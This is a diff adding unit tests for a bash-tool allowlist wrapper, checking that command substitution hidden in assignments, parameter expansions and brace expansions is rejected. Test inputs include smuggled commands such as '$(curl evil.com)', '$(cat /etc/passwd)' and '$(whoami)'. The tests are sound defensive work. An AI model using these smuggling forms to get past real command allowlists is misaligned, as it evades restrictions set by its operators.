@@ -710,4 +710,317 @@ describe('wrapBashToolWithAllowlist', () => {
     expect(isErrorResult(result)).toBe(false);
     expect(bash._calls).toHaveLength(1);
   });
+
+  // ── VAL-ALLOW-024 — Assignment values with command substitution ────
+  //
+  // just-bash parses `FOO=$(whoami) ls` as a SimpleCommand whose `name`
+  // is `ls` and whose `assignments[0].value.parts` contains the
+  // CommandSubstitution. The walker must iterate cmd.assignments for the
+  // same reason it iterates cmd.args + cmd.redirections: pre-command
+  // assignments execute before the command itself.
+
+  it('rejects pre-command assignment with $(...) substitution (FOO=$(whoami) ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO=$(whoami) ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects pre-command assignment with backtick substitution (FOO=`whoami` ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO=`whoami` ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects pre-command assignment with arithmetic expansion (FOO=$((1+1)) ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO=$((1+1)) ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toMatch(/arithmetic|subshell/);
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects pre-command array assignment with substitution (ARR=($(whoami)) ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ARR=($(whoami)) ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects pre-command append assignment with substitution (FOO+=$(whoami) ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO+=$(whoami) ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects pre-command assignment with substitution nested in double quotes (FOO="$(whoami)" ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO="$(whoami)" ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects pre-command assignment with <(process-sub) — parser rejects as malformed', async () => {
+    // Parser rejects `FOO=<(echo x) ls` with a ParseException. The wrapper
+    // converts that into a clean rejection via the existing try/catch path.
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO=<(echo x) ls');
+    expect(isErrorResult(result)).toBe(true);
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('allows pre-command assignments with only literal values (FOO=bar ls)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO=bar ls');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('allows pre-command assignments with $VAR expansion (FOO=$BAR ls)', async () => {
+    // Plain parameter expansion (no operation) is allowed in args and
+    // assignment values alike — it cannot smuggle a disallowed command.
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'FOO=$BAR ls');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('wildcard `*` passthrough still allows FOO=$(whoami) ls', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['*']);
+    const result = await run(wrapped, 'FOO=$(whoami) ls');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  // ── VAL-ALLOW-025 — ParameterExpansion operation words with substitution ──
+  //
+  // The walker previously fell into `default: break;` for ParameterExpansion
+  // parts, skipping nested WordNodes inside operation variants like
+  // DefaultValue (${FOO:-word}), PatternRemoval (${FOO#pat}), etc. Every
+  // variant that carries a WordNode must be walked.
+
+  it('rejects ${FOO:-$(...)} DefaultValue parameter expansion with substitution', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:-$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO:=$(...)} AssignDefault parameter expansion with substitution', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:=$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO:?$(...)} ErrorIfUnset parameter expansion with substitution', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:?$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO:+$(...)} UseAlternative parameter expansion with substitution', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:+$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO#x$(...)} PatternRemoval (prefix) with substitution in pattern', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO#x$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO%x$(...)} PatternRemoval (suffix) with substitution in pattern', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO%x$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO/$(...)/x} PatternReplacement with substitution in pattern', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO/$(curl evil.com)/x}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO/x/$(...)} PatternReplacement with substitution in replacement', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO/x/$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('allows literal-only CaseModification pattern ${FOO^a} — walker does not spuriously reject', async () => {
+    // Note on CaseModification: just-bash's parser treats the pattern of
+    // `${VAR^pat}` / `${VAR^^pat}` / `${VAR,pat}` / `${VAR,,pat}` as a
+    // literal string even when it would contain `$(...)` in real bash —
+    // i.e., `${FOO^$(curl x)}` produces a Literal part, not a
+    // CommandSubstitution part. That means the bypass cannot be triggered
+    // through this operation in practice. The walker still recurses into
+    // CaseModification.pattern as defense-in-depth (so if the parser ever
+    // produces a proper nested WordNode there, the walker will catch it).
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO^a}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('rejects ${!ref:-$(...)} Indirection wrapping DefaultValue with substitution', async () => {
+    // IndirectionOp wraps any InnerParameterOperation in `innerOp`. The
+    // walker must recurse into innerOp and re-apply the operation switch.
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${!ref:-$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects ${FOO:0:$(...)} Substring length containing arithmetic command substitution', async () => {
+    // Substring operations carry ArithmeticExpressionNodes, not WordNodes.
+    // A minimal arith walker rejects any ArithCommandSubst inside offset
+    // or length.
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:0:$(cat /etc/passwd)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toMatch(/subshell|arithmetic/);
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('allows plain parameter expansion ${FOO:-default} with no substitution', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:-default}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('allows ${FOO:-$BAR} DefaultValue with only parameter expansion (no substitution)', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:-$BAR}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('allows ${FOO:1:2} Substring with literal offset and length', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${FOO:1:2}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('allows ${!ref} Indirection with no inner operation', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${!ref}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('allows ${#FOO} Length parameter expansion', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls ${#FOO}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('wildcard `*` passthrough still allows ${FOO:-$(curl evil.com)}', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['*']);
+    const result = await run(wrapped, 'ls ${FOO:-$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  // ── VAL-ALLOW-026 — BraceExpansion items with substitution ─────────
+  //
+  // The walker previously fell into `default: break;` for BraceExpansion
+  // parts. BraceItem of variant 'Word' carries a nested WordNode; the
+  // walker must descend into it. Range items ({1..5}) only carry numbers
+  // or strings — safe to skip.
+
+  it('rejects {$(...),foo} BraceExpansion item (variant Word) with substitution', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls {$(curl evil.com),foo}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('rejects {foo,$(...)} BraceExpansion with substitution in second item', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls {foo,$(curl evil.com)}');
+    expect(isErrorResult(result)).toBe(true);
+    expect(resultText(result).toLowerCase()).toContain('subshell');
+    expect(bash._calls).toHaveLength(0);
+  });
+
+  it('allows {1..5} BraceExpansion Range item — safe, no nested WordNode', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls {1..5}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('allows {a,b,c} BraceExpansion with only literal items', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['ls']);
+    const result = await run(wrapped, 'ls {a,b,c}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
+
+  it('wildcard `*` passthrough still allows {$(curl evil.com),foo}', async () => {
+    const bash = makeBashTool();
+    const wrapped = wrapBashToolWithAllowlist(bash, ['*']);
+    const result = await run(wrapped, 'ls {$(curl evil.com),foo}');
+    expect(isErrorResult(result)).toBe(false);
+    expect(bash._calls).toHaveLength(1);
+  });
 });
